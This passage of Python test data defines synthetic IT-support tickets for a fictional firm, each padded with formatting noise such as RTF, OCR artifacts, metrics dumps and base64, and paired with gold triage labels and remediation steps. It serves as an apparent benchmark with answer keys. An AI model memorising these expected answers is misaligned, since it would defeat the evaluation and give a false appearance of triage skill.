                "{\\colortbl ;\\red0\\green0\\blue0;\\red44\\green62\\blue80;}\n"
                "{\\*\\generator Riched20 10.0.22621}\\viewkind4\\uc1\n"
                "\\pard\\sl276\\slmult1\\cf1\\f0\\fs22 Hi Support Team,\\par\n"
                "\\par\n"
                "\\b Problem Description:\\b0\\par\n"
                "I am unable to map the network drive \\\\\\\\fs-compliance-01\\\\shared on my "
                "workstation since this morning.  When I try to reconnect the mapped drive "
                "through \\cf2\\ul File Explorer > Map Network Drive\\cf1\\ulnone , I receive a "
                "generic Windows error and the connection times out after roughly 30 seconds.\\par\n"
                "\\par\n"
                "\\b Steps I have already tried:\\b0\\par\n"
                "{\\pntext\\f1\\'B7\\tab}{\\*\\pn\\pnlvlblt\\pnf1\\pnindent360{\\pntxtb\\'B7}}"
                "\\fi-360\\li720 Rebooted the workstation twice\\par\n"
                "{\\pntext\\f1\\'B7\\tab}Cleared the Windows credential cache via "
                "\\f0\\fs18 cmdkey /delete:fs-compliance-01\\f0\\fs22\\par\n"
                "{\\pntext\\f1\\'B7\\tab}Ran \\f0\\fs18 net use \\\\\\\\fs-compliance-01\\\\shared "
                "/user:CONTOSO\\\\amoretti P@ss\\f0\\fs22  — same timeout\\par\n"
                "{\\pntext\\f1\\'B7\\tab}Pinged fs-compliance-01 — responds with 10.42.7.20, "
                "avg 2 ms\\par\n"
                "\\par\n"
                "\\b Impact:\\b0  I cannot access any of the shared compliance audit files "
                "and have a regulatory filing due by end of day Friday.\\par\n"
                "\\par\n"
                "Please advise urgently.\\par\n"
                "\\par\n"
                "\\i Angela Moretti\\i0\\par\n"
                "Compliance Department | Desk 4-118 | Ext. 7742\\par\n"
                "}\n"
            ),
            category=Category.DATA_STORAGE,
            priority=Priority.P2,
            team=Team.DATA_PLATFORM,
            needs_escalation=False,
            missing_info=[MissingInfo.AFFECTED_SYSTEM, MissingInfo.ERROR_MESSAGE],
            next_best_action=(
                "Investigate network drive mapping failure for \\\\fs-compliance-01\\shared — "
                "user receives a timeout after 30 seconds despite the server responding to "
                "ping.  Strip RTF formatting noise to extract the core issue, then check "
                "SMB connectivity and credential cache state."
            ),
            remediation_steps=[
                "Verify SMB connectivity to fs-compliance-01 on port 445 from the user's subnet.",
                "Check if the user's AD computer account has valid Kerberos tickets for the file server.",
                "Confirm the shared folder permissions on fs-compliance-01 include the Compliance group.",
                "Review recent Group Policy changes that may have altered drive-mapping logon scripts.",
                "If SMB signing or encryption policies changed, ensure client and server negotiate the same version.",
            ],
            reporter_name="Angela Moretti",
            reporter_email="angela.moretti@contoso.com",
            reporter_department="Compliance",
            channel=Channel.EMAIL,
            tags=["data-cleanup", "rtf-markup", "formatting-noise"],
            difficulty="hard",
        ),
        # ── DC-032  Email reply chain with conflicting information ───────
        ScenarioDefinition(
            scenario_id="DC-032",
            subject="Re: Re: FW: Multiple IT issues - VPN / printer / password",
            description=(
                "From: Tomás Reyes <tomas.reyes@contoso.com>\n"
                "Sent: Wednesday, April 2, 2026 3:18 PM\n"
                "To: IT Support <it.support@contoso.com>\n\n"
                "Hi team — sorry for all the back-and-forth.  Please DISREGARD the VPN and "
                "printer issues from my earlier emails, those were resolved by a colleague.\n\n"
                "My ACTUAL current problem: I cannot reset my Active Directory password.  "
                "When I go to https://passwordreset.contoso.com and enter my username "
                "(treyes), the MFA challenge never arrives on my phone.  I have tried both "
                "SMS and the Authenticator app push notification — neither comes through.  "
                "My account is not locked (I can still log in with my current password) but "
                "it expires tomorrow and I will be locked out of all trading systems.\n\n"
                "Please help ASAP.\n"
                "Tomás\n\n"
                "────────────────────────────────────────\n"
                "From: Tomás Reyes <tomas.reyes@contoso.com>\n"
                "Sent: Wednesday, April 2, 2026 1:45 PM\n"
                "To: IT Support <it.support@contoso.com>\n\n"
                "Update — the VPN issue fixed itself after the network team rebooted the "
                "concentrator, but now the 4th-floor color printer (HP LaserJet MFP E877) "
                "is jammed and showing error code 13.A3.D4 on the display panel.  Can "
                "someone come take a look?  Also I still need to reset my password before "
                "tomorrow.\n\n"
                "────────────────────────────────────────\n"
                "From: Tomás Reyes <tomas.reyes@contoso.com>\n"
                "Sent: Wednesday, April 2, 2026 9:02 AM\n"
                "To: IT Support <it.support@contoso.com>\n\n"
                "Good morning, I'm having trouble connecting to the Contoso VPN from my "
                "home office.  The Cisco AnyConnect client shows 'Connection attempt has "
                "failed' after entering my credentials.  I'm on Comcast residential, if "
                "that matters.  I also need a password reset but the VPN thing is more "
                "urgent right now.\n"
            ),
            category=Category.ACCESS_AUTH,
            priority=Priority.P3,
            team=Team.IAM,
            needs_escalation=False,
            missing_info=[MissingInfo.AUTHENTICATION_METHOD],
            next_best_action=(
                "Process password reset for treyes — user reports that the self-service "
                "password reset MFA challenge (SMS and Authenticator push) is not arriving, "
                "and the current password expires tomorrow.  Ignore earlier VPN and printer "
                "issues which the user confirmed are resolved."
            ),
            remediation_steps=[
                "Verify the user's MFA registration in Azure AD — confirm phone number and Authenticator device.",
                "Check Azure MFA service health for any delivery delays on SMS or push notifications.",
                "If MFA is unreachable, perform an admin-assisted password reset with temp password; force change.",
                "Re-register the user's MFA methods if the Authenticator token has drifted or phone number changed.",
                "Extend the password expiry by 48 hours if the reset cannot be completed before end of day.",
            ],
            reporter_name="Tomás Reyes",
            reporter_email="tomas.reyes@contoso.com",
            reporter_department="Trading",
            channel=Channel.EMAIL,
            tags=["data-cleanup", "conflicting-replies", "reply-chain"],
            difficulty="hard",
        ),
        # ── DC-033  Raw Prometheus / Grafana metrics dump ────────────────
        ScenarioDefinition(
            scenario_id="DC-033",
            subject="URGENT — db-analytics-07 disk space critical",
            description=(
                "Here is the data from our Grafana dashboard for the last 6 hours.  "
                "I exported the raw Prometheus metrics so you can see the trend:\n\n"
                "# HELP node_cpu_seconds_total Seconds the CPUs spent in each mode.\n"
                "# TYPE node_cpu_seconds_total counter\n"
                'node_cpu_seconds_total{cpu="0",mode="idle"} 1.84629837e+06\n'
                'node_cpu_seconds_total{cpu="0",mode="system"} 42871.23\n'
                'node_cpu_seconds_total{cpu="0",mode="user"} 318744.91\n'
                'node_cpu_seconds_total{cpu="1",mode="idle"} 1.83998241e+06\n'
                'node_cpu_seconds_total{cpu="1",mode="system"} 44102.67\n'
                'node_cpu_seconds_total{cpu="1",mode="user"} 321556.88\n'
                "# HELP node_memory_MemTotal_bytes Total memory in bytes.\n"
                "node_memory_MemTotal_bytes 6.7479674880e+10\n"
                "node_memory_MemAvailable_bytes 4.129587200e+09\n"
                "node_memory_Buffers_bytes 2.18390528e+08\n"
                "node_memory_Cached_bytes 1.2884901888e+10\n"
                "# HELP node_disk_io_time_seconds_total Total seconds spent doing I/Os.\n"
                'node_disk_io_time_seconds_total{device="sda"} 98712.44\n'
                'node_disk_io_time_seconds_total{device="sdb"} 341289.71\n'
                'node_disk_io_time_seconds_total{device="sdc"} 2187.03\n'
                "# HELP node_filesystem_avail_bytes Available filesystem size in bytes.\n"
                'node_filesystem_avail_bytes{device="/dev/sda1",mountpoint="/"} 8.1289175040e+09\n'
                'node_filesystem_avail_bytes{device="/dev/sdb1",mountpoint="/data"} 1.048576e+07\n'
                'node_filesystem_size_bytes{device="/dev/sdb1",mountpoint="/data"} 1.073741824e+12\n'
                'node_filesystem_avail_bytes{device="/dev/sdc1",mountpoint="/backup"} 4.29496729e+11\n'
                "# HELP node_disk_read_bytes_total Total number of bytes read.\n"
                'node_disk_read_bytes_total{device="sda"} 5.8100735e+10\n'
                'node_disk_read_bytes_total{device="sdb"} 9.7821548134e+11\n'
                'node_disk_written_bytes_total{device="sdb"} 1.06889410765e+12\n\n'
                "As you can see /data on sdb1 has only ~10 MB free out of 1 TB.  The "
                "database server db-analytics-07 is about to run out of disk and the "
                "analytics pipeline will halt.  We need emergency cleanup or a volume "
                "expansion ASAP before the overnight batch job kicks off at 02:00 UTC."
            ),
            category=Category.DATA_STORAGE,
            priority=Priority.P1,
            team=Team.DATA_PLATFORM,
            needs_escalation=True,
            missing_info=[MissingInfo.AFFECTED_USERS, MissingInfo.BUSINESS_IMPACT],
            next_best_action=(
                "URGENT — db-analytics-07 /data volume is nearly full (~10 MB free of 1 TB).  "
                "Expand the volume or purge stale data before the 02:00 UTC batch job.  "
                "Ignore the large Prometheus metrics dump and focus on the disk-space issue."
            ),
            remediation_steps=[
                "SSH into db-analytics-07 and confirm current disk usage with df -h /data.",
                "Identify and remove or archive old analytics temp files under /data/tmp and /data/staging.",
                "If immediate space cannot be freed, expand the /dev/sdb1 volume via the storage array or cloud.",
                "Notify the Data Engineering team to delay the 02:00 UTC batch job until disk space is safe.",
                "Set up a Prometheus alert for node_filesystem_avail_bytes < 5% to catch this earlier in future.",
            ],
            reporter_name="Priyanka Sharma",
            reporter_email="priyanka.sharma@contoso.com",
            reporter_department="Data Engineering",
            channel=Channel.PORTAL,
            tags=["data-cleanup", "monitoring-metrics", "time-series-dump"],
            difficulty="hard",
        ),
        # ── DC-034  PDF-to-text conversion artifacts ─────────────────────
        ScenarioDefinition(
            scenario_id="DC-034",
            subject="Software license expiration — Bloomberg Terminal B-PIPE",
            description=(
                "C o n t o s o   F i n a n c i a l   S e r v i c e s        Page 1 of 3\n"
                "─────────────────────────────────────────────────────────────\n"
                "IT  Ser vice  Reques t  For m        Date:  03 / 28 / 2026\n"
                "─────────────────────────────────────────────────────────────\n\n"
                "Reques tor :   Kwame  Asan te        Dep t:  Ri sk  Managemen t\n"
                "Ext :  6 6 1 4        Fl oor :  12        Buil ding :  HQ - Eas t\n\n"
                "Cate gory :  So f tware  License  Renewal\n"
                "Priori ty :  Medium\n\n"
                "Descri p tion :\n"
                "Our  Bl oomberg  Terminal  B-PIPE  da ta  f eed  license  is  set  to  "
                "expi re  on  Apri l  15 ,  2026.   We  cur ren tly  have  8  concurren t  "
                "sea ts  and  need  to  renew  f or  at  leas t  12  sea ts  to  cover  the  "
                "new  hi res  in  Ri sk  and  Por t f olio  Managemen t.\n\n"
                "C o n t o s o   F i n a n c i a l   S e r v i c e s        Page 2 of 3\n"
                "─────────────────────────────────────────────────────────────\n\n"
                "The  cur ren t  con t rac t  number  is  BB - ENT - 2024 - 04871  and  our  "
                "accoun t  manager  at  Bl oomberg  is  Sarah  Chen  ( schen@bloomberg.ne t ) .  "
                "I  have  a t tached  the  origi nal  order  f orm  ( PDF )  bu t  the  "
                "a t tachmen t  may  no t  have  come  through  proper ly.\n\n"
                "Addi tional  no tes :\n"
                "- The  f i  ligature  in  ' fi nancial '  renders  as  separ ate  chars\n"
                "- Head ers  and  f oo ters  repea t  on  every  page  due  to  PDF  extrac tion\n"
                "- Page  numbers  are  in tersp ersed  in  the  tex t  s tream\n\n"
                "C o n t o s o   F i n a n c i a l   S e r v i c e s        Page 3 of 3\n"
                "─────────────────────────────────────────────────────────────\n\n"
                "Please  process  this  renewal  be f ore  Apri l  10  to  avoi d  any  "
                "in terrup tion  in  ser vice.   The  cos t  cen ter  is  CC - 4420 - RM.\n\n"
                "Than k  you ,\n"
                "Kwame  Asan te"
            ),
            category=Category.SOFTWARE,
            priority=Priority.P3,
            team=Team.ENTERPRISE_APPS,
            needs_escalation=False,
            missing_info=[MissingInfo.APPLICATION_VERSION],
            next_best_action=(
                "Renew Bloomberg Terminal B-PIPE license (contract BB-ENT-2024-04871) "
                "before April 15, 2026 — expand from 8 to 12 concurrent seats.  Contact "
                "Bloomberg account manager Sarah Chen.  Ignore PDF-to-text conversion "
                "artifacts (broken ligatures, repeated headers/footers, page numbers)."
            ),
            remediation_steps=[
                "Contact Bloomberg account manager Sarah Chen to initiate renewal of contract BB-ENT-2024-04871.",
                "Confirm the seat count increase from 8 to 12 with the Risk Management budget owner.",
                "Obtain purchase approval for cost center CC-4420-RM and submit the PO before April 10.",
                "Coordinate with Enterprise Apps to provision the 4 additional B-PIPE seats once license is active.",
                "Update the software asset inventory with the new seat count and expiry date.",
            ],
            reporter_name="Kwame Asante",
            reporter_email="kwame.asante@contoso.com",
            reporter_department="Risk Management",
            channel=Channel.PORTAL,
            tags=["data-cleanup", "pdf-conversion", "ocr-artifacts"],
            difficulty="hard",
        ),
        # ── DC-035  Email with enormous CC/BCC list and auto-reply noise ─
        ScenarioDefinition(
            scenario_id="DC-035",
            subject="Re: Shared mailbox clientservices@ not receiving external emails",
            description=(
                "From: Nadia Volkov <nadia.volkov@contoso.com>\n"
                "To: IT Support <it.support@contoso.com>\n"
                "CC: james.wu@contoso.com; maria.gonzalez@contoso.com; "
                "ahmed.hassan@contoso.com; lisa.chen@contoso.com; "
                "robert.smith@contoso.com; patricia.jones@contoso.com; "
                "david.kim@contoso.com; sarah.taylor@contoso.com; "
                "michael.brown@contoso.com; jennifer.davis@contoso.com; "
                "christopher.wilson@contoso.com; amanda.martinez@contoso.com; "
                "daniel.anderson@contoso.com; jessica.thomas@contoso.com; "
                "matthew.jackson@contoso.com; ashley.white@contoso.com; "
                "joshua.harris@contoso.com; emily.clark@contoso.com; "
                "andrew.lewis@contoso.com; stephanie.walker@contoso.com; "
                "clientservices@contoso.com\n\n"
                "Hi IT,\n\n"
                "Our shared mailbox clientservices@contoso.com has stopped receiving "
                "emails from external senders.  Internal emails arrive fine.  We first "
                "noticed the problem sometime this week but are unsure of the exact time.  "
                "Our clients are complaining that their emails bounce with a '550 5.7.1 "
                "Unable to relay' NDR.  This is affecting multiple client relationships.\n\n"
                "Can someone investigate the Exchange transport rules or the inbound "
                "connector?  The mailbox has 47 members and we all see the same behaviour.\n\n"
                "Thanks,\nNadia\n\n"
                "--- Auto-reply from james.wu@contoso.com ---\n"
                "Thank you for your email.  I am currently out of the office from March 31 "
                "to April 7 with limited access to email.  For urgent matters please "
                "contact maria.gonzalez@contoso.com.\n\n"
                "--- Auto-reply from patricia.jones@contoso.com ---\n"
                "I am on parental leave until June 2026.  Please direct all Client "
                "Services inquiries to the clientservices@contoso.com shared mailbox or "
                "contact david.kim@contoso.com.\n\n"
                "--- Auto-reply from ashley.white@contoso.com ---\n"
                "Thanks for reaching out!  I'm in training all week and will respond when "
                "I return on April 8.  For immediate assistance email "
                "clientservices@contoso.com.\n\n"
                "--- Auto-reply from daniel.anderson@contoso.com ---\n"
                "I am out sick today.  I will reply as soon as I am able.\n"
            ),
            category=Category.SOFTWARE,
            priority=Priority.P2,
            team=Team.ENTERPRISE_APPS,
            needs_escalation=False,
            missing_info=[MissingInfo.TIMESTAMP, MissingInfo.AFFECTED_USERS],
            next_best_action=(
                "Investigate why the shared mailbox clientservices@contoso.com is rejecting "
                "external inbound email with '550 5.7.1 Unable to relay'.  Check Exchange "
                "transport rules and inbound connectors.  Ignore the large CC list and "
                "concatenated out-of-office auto-replies."
            ),
            remediation_steps=[
                "Check Exchange Online message trace for emails sent to clientservices@contoso.com in the last 7 days.",
                "Review inbound mail-flow connectors for changes that may block external relay to shared mailboxes.",
                "Inspect Exchange transport rules for any rule rejecting mail based on recipient type or origin.",
                "Verify that the shared mailbox has not exceeded its storage quota, which can cause inbound rejection.",
                "Once resolved, ask Nadia's team to confirm receipt of a test email from an external address.",
            ],
            reporter_name="Nadia Volkov",
            reporter_email="nadia.volkov@contoso.com",
            reporter_department="Client Services",
            channel=Channel.EMAIL,
            tags=["data-cleanup", "massive-cc-list", "auto-reply-noise"],
            difficulty="hard",
        ),
        # ── DC-036  Screenshot OCR with layout / table artifacts ─────────
        ScenarioDefinition(
            scenario_id="DC-036",
            subject="SAP transaction VA01 failing — screenshot attached",
            description=(
                "[OCR extracted text from screenshot — original image lost in transit]\n\n"
                "+---------------------+-------------------+--------------------+\n"
                "|  SAP  ECC  6.0      |   Tran  saction   |    VA 01           |\n"
                "+---------------------+-------------------+--------------------+\n"
                "|  Cli ent  :  800    |   Us er  :  HJO   |  Sys  :  PRD      |\n"
                "|                     |   HAN  SSON       |                    |\n"
                "+---------------------+-------------------+--------------------+\n\n"
                "Err or  Mes sage  (red  bar  at  bot tom  of  scr een):\n"
                "+----------------------------------------------------------+\n"
                '|  M7  021  :  " Materi al  40 0 - 1 1 7  has  no t  been  |\n'
                '|  mai ntai ned  in  pla nt  21 00 "                        |\n'
                "+----------------------------------------------------------+\n\n"
                "I  am  try ing  to  cre ate  a  sal es  ord er  in  VA 01  for\n"
                "mat eri al  40 0 - 1 1 7  (Wi dge t  Assembl y  Ki t  -  Lar ge)\n"
                "bu t  the  sys tem  thr ows  err or  M7  021  when  I  sel ect\n"
                "pla nt  21 00  ( Chi cago  Dist ribu tion  Cen ter ) .\n\n"
                "Thi s  mat eri al  was  wor king  fi ne  las t  wee k.   I  thi nk\n"
                "some one  may  have  dele ted  or  modi fi ed  the  mat eri al\n"
                "mas ter  reco rd  f or  pla nt  21 00  duri ng  the  week end\n"
                "main tenan ce  win dow.\n\n"
                "Hen ri k  Johann sson  |  Fin ance  |  Ext  48 81"
            ),
            category=Category.SOFTWARE,
            priority=Priority.P2,
            team=Team.ENTERPRISE_APPS,
            needs_escalation=False,
            missing_info=[MissingInfo.ERROR_MESSAGE, MissingInfo.STEPS_TO_REPRODUCE],
            next_best_action=(
                "Investigate SAP error M7 021 for material 400-117 in plant 2100 — the "
                "material master record may have been modified or deleted during the "
                "weekend maintenance window.  Restore or re-extend the material to plant "
                "2100 so sales order creation in VA01 works again."
            ),
            remediation_steps=[
                "Check material master for 400-117 in SAP transaction MM03 — verify plant 2100 view exists.",
                "Review the change log (CDHDR/CDPOS) for material 400-117 to identify recent modifications.",
                "If plant 2100 view was deleted, re-extend material using MM01 with sales, MRP, and purchasing views.",
                "Test sales order creation in VA01 with material 400-117 and plant 2100 to confirm the fix.",
                "Notify SAP Basis team to review weekend maintenance scripts that may have altered material masters.",
            ],
            reporter_name="Henrik Johansson",
            reporter_email="henrik.johansson@contoso.com",
            reporter_department="Finance",
            channel=Channel.PORTAL,
            tags=["data-cleanup", "ocr-layout", "table-artifacts"],
            difficulty="hard",
        ),
        # ── DC-037  Multiple inline base64-encoded non-image files ───────
        ScenarioDefinition(
            scenario_id="DC-037",
            subject="SharePoint upload failing — document too large",
            description=(
                "Hi IT Support,\n\n"
                "I have been trying to upload a regulatory filing bundle to our SharePoint "
                "site (https://contoso.sharepoint.com/sites/Legal/FilingArchive) but keep "
                "getting a 'File size exceeds the allowed limit' error.  The bundle is a "
                "ZIP file containing three documents that total about 380 MB.\n\n"
                "I've pasted the base64-encoded files below in case the attachment didn't "
                "come through:\n\n"
                "=== BEGIN regulatory_response_v4.docx (base64) ===\n"
                "UEsDBBQAAAAIAGRVZ1kAAAAAAAAAAAAAABIAHAB3b3JkL2RvY3VtZW50LnhtbFVUCQAD"
                "k9J2Z5PSdmd1eAsAAQT2AQAABBQAAAANy7EOgCAQBNC9X0F6ew8TY0Ws/Q0LuJgTuSN3"
                "GPn7YGHiZCYz+XlkfdVCnoMOqxIYGAEBfmqNvDSEeJ6uc+yiKiHhHUGHTQ6tBfY3++sP"
                "AAAA//8DAFBLAQItABQAAAAIAGRVZ1kAAAAAAAAAAAAAAAASABgAAAAAAAEAAACkgQAAAA"
                "... [truncated — approximately 87,000 more base64 characters] ...\n"
                "=== END regulatory_response_v4.docx ===\n\n"
                "=== BEGIN counterparty_exposure_summary.csv (base64) ===\n"
                "Q291bnRlcnBhcnR5LERlc2ssRXhwb3N1cmVfVVNELE5vdGlvbmFsX1VTRCxSYXRpbmcs"
                "TWF0dXJpdHkNCkFjbWUgQ29ycCxGaXhlZCBJbmNvbWUsMTI1MDAwMDAsNTAwMDAwMDAs"
                "QUEsMjAyNy0wNi0xNQ0KQmV0YSBMdGQsRXF1aXRpZXMsODcwMDAwMCwzMjAwMDAwMCw"
                "... [truncated — approximately 41,000 more base64 characters] ...\n"
                "=== END counterparty_exposure_summary.csv ===\n\n"
                "=== BEGIN original_request_thread.eml (base64) ===\n"
                "RnJvbTogRmF0aW1hIEFsLVJhc2hpZCA8ZmF0aW1hLmFscmFzaGlkQGNvbnRvc28uY29t"
                "PgpUbzogTGVnYWwgRmlsaW5ncyA8bGVnYWwuZmlsaW5nc0Bjb250b3NvLmNvbT4KU3Vi"
                "amVjdDogUmVndWxhdG9yeSBGaWxpbmcgQnVuZGxlIC0gUTEgMjAyNgpEYXRlOiBUaHUs"
                "... [truncated — approximately 23,000 more base64 characters] ...\n"
                "=== END original_request_thread.eml ===\n\n"
                "The SharePoint site collection admin is Marcus Webb (marcus.webb@contoso.com).  "
                "Our current upload limit seems to be set to 250 MB.  Can you increase it "
                "to at least 500 MB or suggest an alternative way to upload this bundle?\n\n"
                "Thanks,\n"
                "Fatima Al-Rashid\n"
                "Legal Department | Floor 9 | Ext. 5523"
            ),
            category=Category.DATA_STORAGE,
            priority=Priority.P3,
            team=Team.DATA_PLATFORM,
            needs_escalation=False,
            missing_info=[MissingInfo.ERROR_MESSAGE],
            next_best_action=(
                "Increase the SharePoint upload size limit for the Legal/FilingArchive site "
                "collection from 250 MB to at least 500 MB, or guide the user to upload via "
                "the SharePoint migration tool / OneDrive sync client.  Ignore the inline "
                "base64-encoded file contents."
            ),
            remediation_steps=[
                "Verify the current max upload size for the Legal site collection in the SharePoint admin center.",
                "Increase the file upload limit to 500 MB via Set-SPOSite -MaxUploadSize or the admin UI.",
                "If the tenant-wide limit is below 500 MB, raise it at the tenant level after IT governance approval.",
                "Advise the user to upload large bundles via the OneDrive sync client or SharePoint Migration Tool.",
                "Confirm the user can successfully upload the 380 MB ZIP file after the limit change.",
            ],
            reporter_name="Fatima Al-Rashid",
            reporter_email="fatima.alrashid@contoso.com",
            reporter_department="Legal",
            channel=Channel.EMAIL,
            tags=["data-cleanup", "base64", "non-image-attachments", "encoded-files"],
            difficulty="hard",
        ),
        # ── DC-038  Voice-to-text transcript with severe recognition errors
        ScenarioDefinition(
            scenario_id="DC-038",
            subject="Laptop battery draining very fast",
            description=(
                "[Transcript from voicemail — automated speech-to-text conversion]\n\n"
                "yeah hi um this is jin ho park from uh quantitative analysis on the um "
                "seventh floor and i'm calling about my laptop um the battery is like "
                "draining super fast like i charge it too a hundred percent in the morning "
                "and buy lunch time its already at like fifteen percent um and thats with "
                "the screen brightness turned all the way down and like no external "
                "monitors or anything plugged in um so its not like im drawing a lot of "
                "power from like peripherals or whatever um i think the problem started "
                "about too weeks ago uh maybe after that windows update that got pushed "
                "out i dont really remember the exact date but it was like right around "
                "when we got that email about the security patch um anyway the laptop is "
                "basically unusable after lunch because i have too keep it plugged in at "
                "my desk which kind of defeats the whole purpose of having a laptop right "
                "um i need too take it too meetings and work from the trading floor "
                "sometimes and their are no power outlets buy the hot desks um also i "
                "noticed the bottom of the laptop gets really hot like uncomfortably hot "
                "um i looked in task manager and theres this process called like system "
                "interrupts or something thats using like thirty percent of the cpu even "
                "when im not doing anything um i dont no if thats related but it seems "
                "like it mite be um could someone please take a look at this i can bring "
                "the laptop buy the help desk on the forth floor whenever is convenient "
                "um my extension is four two eight seven um thanks bye"
            ),
            category=Category.HARDWARE,
            priority=Priority.P3,
            team=Team.ENDPOINT,
            needs_escalation=False,
            missing_info=[MissingInfo.DEVICE_INFO, MissingInfo.ENVIRONMENT_DETAILS],
            next_best_action=(
                "Investigate rapid battery drain and overheating on Jin-Ho Park's laptop — "
                "battery goes from 100% to 15% by midday, 'System Interrupts' process at "
                "~30% CPU.  Likely a driver issue introduced by a recent Windows security "
                "patch.  Schedule a desk-side visit or ask user to bring the device to the "
                "help desk on the 4th floor."
            ),
            remediation_steps=[
                "Run powercfg /batteryreport and check design capacity vs. full-charge capacity for cell degradation.",
                "Review recently installed Windows updates and cross-reference with known battery-drain issues.",
                "Investigate high 'System Interrupts' CPU — run LatencyMon or xperf to find the offending driver.",
                "If a specific driver is the cause, roll it back or install the latest version from the manufacturer.",
                "If battery health shows significant degradation (>20% loss), initiate a warranty battery replacement.",
            ],
            reporter_name="Jin-Ho Park",
            reporter_email="jinho.park@contoso.com",
            reporter_department="Quantitative Analysis",
            channel=Channel.PHONE,
            tags=["data-cleanup", "speech-to-text", "transcription-errors", "voice-transcript"],
            difficulty="hard",
        ),
        # ── DC-039  Very long email — corporate newsletter with buried issue
        ScenarioDefinition(
            scenario_id="DC-039",
            subject="FW: Contoso Weekly Pulse — March Edition + quick IT question",
            description=(
                "Hey IT,\n\n"
                "Quick question — my Outlook has been crashing every time I try to open "
                "calendar invites. Started yesterday. Can someone take a look?\n\n"
                "Thanks,\nSophie\n\n"
                "---------- Forwarded message ----------\n"
                "From: Internal Communications <comms@contoso.com>\n"
                "Date: Monday, March 16, 2026\n"
                "Subject: Contoso Weekly Pulse — March Edition\n"
                "To: All Employees <all-staff@contoso.com>\n\n"
                "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
                "           CONTOSO WEEKLY PULSE — MARCH 2026\n"
                "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n\n"
                "🏢 FROM THE CEO'S DESK\n"
                "Dear Contoso family, I am thrilled to share that our Q1 results "
                "have exceeded expectations across all business units. Revenue grew "
                "14% year-over-year, driven by exceptional performance in our "
                "Institutional Trading and Wealth Management divisions. I want to "
                "personally thank each of you for your dedication and hard work "
                "during what has been a transformative quarter. Our client "
                "satisfaction scores reached an all-time high of 94.2%, and we "
                "onboarded 37 new institutional clients. As we look ahead to Q2, "
                "I am confident that we will continue this momentum.\n\n"
                "📅 UPCOMING EVENTS & DEADLINES\n"
                "• March 20 — Mandatory Compliance Training (all employees)\n"
                "• March 22 — Annual Charity Gala at The Grand Ballroom (RSVP by 3/18)\n"
                "• March 25 — Q1 Performance Reviews begin (managers check Workday)\n"
                "• March 28 — Building 3 elevator maintenance (use stairs, floors 1-4)\n"
                "• April 1 — Benefits enrollment window opens\n"
                "• April 3 — Town Hall with CFO Rebecca Martinez (2:00 PM ET, Rm 401)\n"
                "• April 7 — Earth Day office volunteer signup deadline\n\n"
                "👥 HR CORNER\n"
                "Welcome to our newest team members joining this month: Tanya Okafor "
                "(Risk Analytics), James Whitfield (Private Banking), Maria Souza "
                "(Client Onboarding), and Vikram Patel (Quantitative Research). "
                "Please make them feel at home! Reminder: the employee referral bonus "
                "has been increased to $5,000 for all technology roles. Submit "
                "referrals through the Workday portal. The annual employee engagement "
                "survey will be distributed next week — your feedback is invaluable "
                "in shaping our workplace culture.\n\n"
                "🏆 EMPLOYEE SPOTLIGHT\n"
                "Congratulations to Diane Cheng from Equity Research for being named "
                "Analyst of the Quarter! Diane's coverage of the semiconductor "
                "sector generated significant alpha for our clients. Her deep-dive "
                "report on supply chain resilience was featured in Bloomberg Markets. "
                "Also a shout-out to the Network Operations team for achieving 99.99% "
                "uptime in February — outstanding work!\n\n"
                "🏗️ FACILITIES UPDATE\n"
                "The Building 2 cafeteria renovation is on schedule for completion "
                "by March 31. Temporary food service is available on the 3rd floor "
                "of Building 1. New standing desk models are available for order "
                "through the Facilities portal — please submit requests by end of "
                "month. Parking garage levels P2 and P3 will undergo restriping "
                "this weekend. Please relocate vehicles by Friday 5 PM.\n\n"
                "📊 MARKET INSIGHTS\n"
                "Our Chief Economist, Dr. Lawrence Kim, published his latest "
                "outlook this week projecting moderate GDP growth of 2.3% for "
                "the remainder of 2026. Key themes include the impact of the "
                "Federal Reserve's rate trajectory, commercial real estate "
                "stabilization, and the continued expansion of AI-driven "
                "financial products. The full report is available on the "
                "Research Portal.\n\n"
                "💡 TECH TIPS FROM IT\n"
                "Did you know you can use Ctrl+Shift+V to paste without formatting? "
                "This week's tip: enable Focus Assist in Windows to mute "
                "notifications during presentations. Also, remember to restart "
                "your laptop at least once a week to ensure updates apply "
                "correctly.\n\n"
                "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
                "Contoso Financial Services | 200 Park Avenue, New York, NY 10166\n"
                "This email is intended for internal distribution only.\n"
                "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"
            ),
            category=Category.SOFTWARE,
            priority=Priority.P3,
            team=Team.ENTERPRISE_APPS,
            needs_escalation=False,
            missing_info=[MissingInfo.APPLICATION_VERSION, MissingInfo.ERROR_MESSAGE],
            next_best_action=(
                "Investigate Outlook crashes when opening calendar invites for Sophie "
                "Tremblay — started the previous day. Likely a corrupt calendar cache "
                "or an add-in conflict after a recent update. Ignore the forwarded "
                "newsletter content."
            ),
            remediation_steps=[
                "Ask the user to confirm the Outlook version (File > Office Account) and whether "
                "they are using desktop or New Outlook.",
                "Launch Outlook in safe mode (outlook.exe /safe) to rule out add-in conflicts.",
                "Clear the Outlook calendar cache by renaming the local .ost file and letting it rebuild.",
                "If the issue persists, run the Microsoft Support and Recovery Assistant (SaRA) calendar diagnostic.",
                "Check for pending Office updates and apply them if available.",
            ],
            reporter_name="Sophie Tremblay",
            reporter_email="sophie.tremblay@contoso.com",
            reporter_department="Wealth Management",
            channel=Channel.EMAIL,
            tags=["data-cleanup", "very-long-email", "buried-issue", "newsletter"],
            difficulty="hard",
        ),
        # ── DC-040  Base64-encoded PDF content dumped inline ──────────────
        ScenarioDefinition(
            scenario_id="DC-040",
            subject="License renewal needed — see attached PDF",
            description=(
                "Hi IT Support,\n\n"
                "I need to renew my Bloomberg Terminal license. My current license "
                "expires at the end of this month and I cannot afford any gap in "
                "access. I attached the approval form from my manager but it looks "
                "like the PDF got embedded weird. Here it is:\n\n"
                "JVBERi0xLjQKMSAwIG9iago8PAovVHlwZSAvQ2F0YWxvZwovUGFnZXMgMiAw"
                "IFIKPj4KZW5kb2JqCjIgMCBvYmoKPDwKL1R5cGUgL1BhZ2VzCi9LaWRzIFsz"
                "IDAgUl0KL0NvdW50IDEKL01lZGlhQm94IFswIDAgNjEyIDc5Ml0KPj4KZW5k"
